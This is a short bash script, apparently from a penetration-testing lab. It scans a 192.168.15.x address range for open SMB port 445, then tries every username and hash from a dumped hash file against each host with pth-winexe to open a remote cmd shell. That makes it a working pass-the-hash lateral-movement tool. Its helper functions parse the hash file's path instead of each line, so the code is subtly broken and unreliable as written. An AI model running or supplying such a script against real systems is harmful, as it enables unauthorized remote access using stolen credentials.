#!/bin/bash
# test hash file
hashfile="/root/bin/passcrack/227/hashes.txt"
# actual hash file 
#hashfile="/root/bin/passcrack/227/hashes"

gethash() { echo ${hashfile} | cut -d":" -f 3,4; }
#gethash() { awk -F: '{print $3 ":" $4}' < ${hashfile}; }
 
getuser() { echo ${hashfile} | cut -d":" -f1 ; }
#getuser() { awk -F: '{print $1}' < ${hashfile}; }
 
for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
   for line in $(cat ${hashfile}); do
       smbhash=$(gethash $line)
       smbuser=$(getuser $line)
      echo "[+]"
      echo "[+] trying $smbuser@$host with $smbhash"
      echo "[+]"
      pth-winexe -U $smbuser%$smbhash //$host cmd
   done
done
